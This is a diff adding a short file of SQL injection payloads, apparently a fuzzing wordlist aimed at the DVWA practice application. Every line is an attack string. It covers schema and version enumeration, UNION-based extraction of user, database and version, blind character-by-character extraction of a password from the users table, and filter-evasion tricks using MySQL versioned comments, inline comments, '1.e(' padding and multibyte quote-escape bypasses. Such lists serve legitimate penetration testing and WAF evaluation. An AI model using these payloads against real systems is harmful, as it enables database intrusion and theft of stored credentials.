@@ -1,0 +1,18 @@
+SELECT * FROM mysql.innodb_table_stats;
+SHOW TABLES IN dvwa;
+SELECT @@innodb_version;
+SELECT @@GLOBAL.VERSION;
+SELECT json_arrayagg(concat_ws(0x3a,table_schema,table_name)) from INFORMATION_SCHEMA.TABLES;
+1' or 1.e(1) or '1'='1
+1.e(ascii 1.e(substring(1.e(select password from users limit 1 1.e,1 1.e) 1.e,1 1.e,1 1.e)1.e)1.e) = 70 or '1'='2
+/*!31337SELECT*/ user()
+/*!12345UNION*/ SELECT table_name
+%A8%27 OR 1=1;--
+%8C%A8%27 OR 1=1--
+%bf' OR 1=1 -- --
+SELECT/*comment*/version()--+
+SELECT/**/user()--+
+SELECT/*!31337version()*/--+
+-1'/**/UNION/**/SELECT/**/NULL,NULL,NULL--+
+1'/*!UNION*/SELECT 1,2,3--+
+'/*!UNION*/SELECT/**/user(),database(),version()--+
